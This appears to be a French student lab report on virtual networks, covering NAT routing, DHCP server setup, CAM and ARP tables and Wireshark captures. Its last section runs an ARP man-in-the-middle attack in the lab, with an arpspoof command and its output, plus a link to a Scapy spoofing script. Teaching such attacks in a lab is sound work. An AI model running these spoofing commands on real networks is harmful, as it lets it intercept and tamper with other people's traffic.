



➜ Tableau d'adressage

Nom
IP

router.tp2.efrei
10.2.1.254/24


node1.tp2.efrei
10.2.1.1/24


🌞 Configuration de router.tp2.efrei


~~~
[bob@localhost ~]$ [bob@localhost ~]$ sudo vi /etc/sysconfig/network-scripts/ifcfg-enp0s3

DEVICE=enp0s3
NAME=routeur

ONBOOT=yes
BOOTPROTO=dhcp

[bob@localhost ~]$ sudo nmcli connection reload
[bob@localhost ~]$ sudo nmcli connection up routeur

[bob@localhost ~]$ ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=113 time=62.8 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=113 time=31.1 ms
~~~
l'autre interface de router.tp2.efrei sera configurée statiquement

voir l'IP demandée dans le tableau d'adressage juste au dessus
~~~
[bob@localhost ~]$ [bob@localhost ~]$ sudo vi /etc/sysconfig/network-scripts/ifcfg-enp0s9

DEVICE=enp0s9
NAME=stat

ONBOOT=yes
BOOTPROTO=static

IPADDR=10.2.1.254
NETMASK=255.255.255.0

[bob@localhost ~]$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:86:d8:bc brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.234/24 brd 192.168.122.255 scope global dynamic noprefixroute enp0s3
       valid_lft 3438sec preferred_lft 3438sec
    inet6 fe80::a00:27ff:fe86:d8bc/64 scope link
       valid_lft forever preferred_lft forever
3: enp0s9: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel state DOWN group default qlen 1000
    link/ether 08:00:27:10:92:a8 brd ff:ff:ff:ff:ff:ff
    inet 10.2.1.254/24 brd 10.2.1.255 scope global noprefixroute enp0s9
       valid_lft forever preferred_lft forever
~~~

~~~
[bob@localhost ~]$ sudo firewall-cmd --add-masquerade
success

[bob@localhost ~]$ sudo firewall-cmd --add-masquerade --permanent
success
~~~

🌞 Configuration de node1.tp2.efrei

configurer de façon statique son IP

voir l'IP demandée dans le tableau d'adressage juste au dessus
~~~
PC1> ip 10.2.1.1/24
PC1> show ip

NAME        : PC1[1]
IP/MASK     : 10.2.1.1/24
GATEWAY     : 0.0.0.0
DNS         :
MAC         : 00:50:79:66:68:00
LPORT       : 20000
RHOST:PORT  : 127.0.0.1:20001
MTU         : 1500
~~~

prouvez avec une commande ping que node1.tp2.efrei peut joindre router.tp2.efrei
~~~
PC1> ping 10.2.1.254

84 bytes from 10.2.1.254 icmp_seq=1 ttl=64 time=2.425 ms
84 bytes from 10.2.1.254 icmp_seq=2 ttl=64 time=1.996 ms
~~~
ajoutez une route par défaut qui passe par router.tp2.efrei
~~~
pc1> ip 10.2.1.1 255.255.255.0 10.2.1.254
Checking for duplicate address...
pc1 : 10.2.1.1 255.255.255.0 gateway 10.2.1.254
~~~

prouvez que vous avez un accès internet depuis node1.tp2.efrei désormais, avec une commande ping

~~~
pc1> ping 8.8.8.8

8.8.8.8 icmp_seq=1 timeout
84 bytes from 8.8.8.8 icmp_seq=2 ttl=112 time=51.213 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=112 time=36.450 ms
~~~

utilisez une commande traceroute pour prouver que vos paquets passent bien par router.tp2.efrei avant de sortir vers internet
~~~
pc1> trace 8.8.8.8
trace to 8.8.8.8, 8 hops max, press Ctrl+C to stop
 1   10.2.1.254   1.688 ms  1.774 ms  2.017 ms
 2   192.168.137.109   14.820 ms  10.653 ms  7.131 ms
 3   255.0.0.0   37.057 ms  34.938 ms  34.113 ms
 4     *  *  *
 5     *  *  *
~~~
➜ A la fin de cette section vous avez donc :

un routeur, qui, grâce à du NAT, est connecté à Internet
il est aussi connecté au LAN 10.2.1.0/24

les clients du LAN, comme node1.tp2.efrei ont eux aussi accès internet, en passant par router.tp2.efrei après l'ajout d'une route

🌞 Afficher la CAM Table du switch

sur le switch IOU mis en place, affichez la CAM Table
un switch apprend les adresses MAC de toutes les personnes qui envoient des messages
la CAM table contient les infos de quelle MAC est branché sur quel port
la commande c'est show mac address-table une fois connecté au terminal du switch

~~~
IOU1#show mac address-table
          Mac Address Table
-------------------------------------------

Vlan    Mac Address       Type        Ports
----    -----------       --------    -----
   1    0050.7966.6800    DYNAMIC     Et0/1
   1    0800.2710.92a8    DYNAMIC     Et0/0
Total Mac Addresses for this criterion: 2

~~~

II. Serveur DHCP

➜ Tableau d'adressage

Nom
IP
router.tp2.efrei
10.2.1.254/24
node1.tp2.efrei
N/A
dhcp.tp2.efrei
10.2.1.253/24



🌞 Install et conf du serveur DHCP sur dhcp.tp2.efrei
~~~
[bob2@localhost ~]$ sudo dnf install dhcp-server -y
Last metadata expiration check: 0:00:40 ago on Mon Dec  9 12:16:31 2024.
Dependencies resolved.
========================================================================================================================
 Package                      Architecture            Version                             Repository               Size
========================================================================================================================
Installing:
 dhcp-server                  x86_64                  12:4.4.2-19.b1.el9                  baseos                  1.2 M
Installing dependencies:
 dhcp-common                  noarch                  12:4.4.2-19.b1.el9                  baseos                  128 k
 ...
~~~

pour l'install du serveur, il faut un accès internet... il suffit d'ajouter là encore une route par défaut, qui passe par router.tp2.efrei

~~~
[bob@localhost ~]$ [ 1806.043652] e1000 0000:00:08.0 enp0s8: NETDEU WATCHDOG: CPU: 0: transmit queue 0 timed out 9060 ms
[1806.143965] e1000 0000:00:08.0 enp0s8: Reset adapter
traceroute 8.8.8.8
traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets
1 _gateway (10.2.1.254) 104.605 ms 104.206 ms 103.976 ms 
2 192.168.122.1 (192.168.122.1) 103.612 ms 103.391 ms 103.158 ms
3 10.0.3.2 (10.0.3.2) 102.909 ms 102.607 ms 102.409 ms
4 * * *
~~~
~~~
[bob@localhost ~]$ sudo vi /etc/dhcp/dhcpd.conf

authoritative;
subnet 10.2.1.0 netmask 255.255.255.0{
	range 10.2.1.10 10.2.1.50;
	option broadcast-address 10.2.1.1;
	option routers 10.2.1.254;
}

[bob@localhost ~]$ sudo systemctl enable dhcpd
Created symlink /etc/systemd/system/multi-user.target.wants/dhcpd.service → /usr/lib/systemd/system/dhcpd.service.
[bob@localhost ~]$ sudo systemctl start dhcpd
~~~
🌞 Test du DHCP sur node1.tp2.efrei
~~~
[bob@localhost ~]$ sudo nmcli connection up dhcp
Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/4)

pc1> show ip

NAME        : pc1[1]
IP/MASK     : 10.2.1.10/24
GATEWAY     : 10.2.1.254
DNS         :
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 42887, 43200/21600/37800
MAC         : 00:50:79:66:68:00
LPORT       : 20005
RHOST:PORT  : 127.0.0.1:20006
MTU         : 1500


pc1> ping 8.8.8.8

84 bytes from 8.8.8.8 icmp_seq=1 ttl=110 time=47.691 ms
~~~

🌟 BONUS
~~~
authoritative;
subnet 10.2.1.0 netmask 255.255.255.0{
	range 10.2.1.10 10.2.1.50;
	option broadcast-address 10.2.1.1;
	option routers 10.2.1.254;
   option domain-name-servers 1.1.1.1;
}


pc1> show ip

NAME        : pc1[1]
IP/MASK     : 10.2.1.10/24
GATEWAY     : 10.2.1.254
DNS         : 1.1.1.1
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 36235, 36240/18120/31710
MAC         : 00:50:79:66:68:00
LPORT       : 20005
RHOST:PORT  : 127.0.0.1:20006
MTU         : 1500
~~~
🌞 Wireshark it !

[doratp2](https://github.com/Ashiibi/Virtualisation/blob/64472abbceeea3ca2575df66660f4e51c154989a/tp2/doratp2.pcapng)


III. ARP

🌞 Affichez la table ARP de router.tp2.efrei
~~~
[bob@localhost network-scripts]$ ip n s
10.2.1.253 dev enp0s8 lladdr 08:00:27:3f:61:26 STALE
10.2.1.10 dev enpos8 lladdr 00:50:79:66:68:00 STALE
192.168.122.1 dev enp0s3 lladdr 52:54:00:23:04:c2 REACHABLE
10.2.1.12 dev enpos8 lladdr 00:50:79:66:68:01 STALE
~~~
🌞 Capturez l'échange ARP avec Wireshark

[arptp2](https://github.com/Ashiibi/Virtualisation/blob/64472abbceeea3ca2575df66660f4e51c154989a/tp2/arptp2.pcapng)

🌞 Envoyer une trame ARP arbitraire
~~~
(kali@ kali)-[~]
$ sudo arping 10.2.1.10
[sudo] password for kali:
ARPING 10.2.1.10
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=0 time=1.612 msec
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=1 time=7.115 msec
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=2 time=2.369 msec
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=3 time=2.428 msec
60 bytes from 00:50:79:66:68:00 (10.2.1.10): index=4 time=2.497 msec


pc1> arp

08:00:27:de:94:cf  10.2.1.254 expires in 86 seconds
08:00:27:c0:26:bb  10.2.1.13 expires in 119 seconds
~~~
🌞 Mettre en place un ARP MITM
~~~
-(kali@kali)-[~]
$ sudo arpspoof -r -t 10.2.1.10 10.2.1.254
8:0:27:c0:26:bb ff:ff:ff:ff:ff:ff 0806 42: arp reply 10.2.1.10 is-at 8:0:27:c0:26:bb
8:0:27:c0:26:bb ff:ff:ff:ff:ff:ff 0806 42: arp reply 10.2.1.10 is-at 8:0:27:c0:26:bb
8:0:27:c0:26:bb ff:ff:ff:ff:ff:ff 0806 42: arp reply 10.2.1.10 is-at 8:0:27:c0:26:bb
8:0:27:c0:26:bb ff:ff:ff:ff:ff:ff 0806 42: arp reply 10.2.1.10 is-at 8:0:27:c0:26:bb
8:0:27:c0:26:bb ff:ff:ff:ff:ff:ff 0806 42: arp reply 10.2.1.10 is-at 8:0:27:c0:26:bb
~~~
🌞 Capture Wireshark arp_mitm.pcap

[arp_mitm](https://github.com/Ashiibi/Virtualisation/blob/64472abbceeea3ca2575df66660f4e51c154989a/tp2/arp_mitm.pcapng)
🌞 Réaliser la même attaque avec Scapy

merci internet [arp_mitm.py](https://github.com/Ashiibi/Virtualisation/blob/64472abbceeea3ca2575df66660f4e51c154989a/tp2/arp_mitm.py)
